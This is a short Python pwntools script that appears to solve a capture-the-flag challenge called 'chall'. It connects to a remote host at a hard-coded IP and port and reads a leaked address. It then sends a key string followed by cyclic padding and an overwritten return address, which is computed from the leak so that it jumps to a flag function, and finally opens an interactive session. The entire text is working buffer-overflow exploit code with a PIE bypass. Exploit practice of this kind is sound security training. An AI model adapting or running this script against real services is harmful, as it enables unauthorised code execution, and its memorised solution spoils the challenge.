from pwn import *
elf = context.binary = ELF('./chall')
context.terminal = 'tmux splitw -h'.split(' ')
p = remote('103.13.207.177', 20006)
p.recvuntil(b':')
offlag = 0x0101295
ofmain = 0x10130c
leak = int(p.recvline().strip()[2:],16)
key = b'CSH-2002-FLAg'+b'\x00' + cyclic(250)
key += p64(leak - ofmain + offlag)
p.sendline(key)
p.interactive()
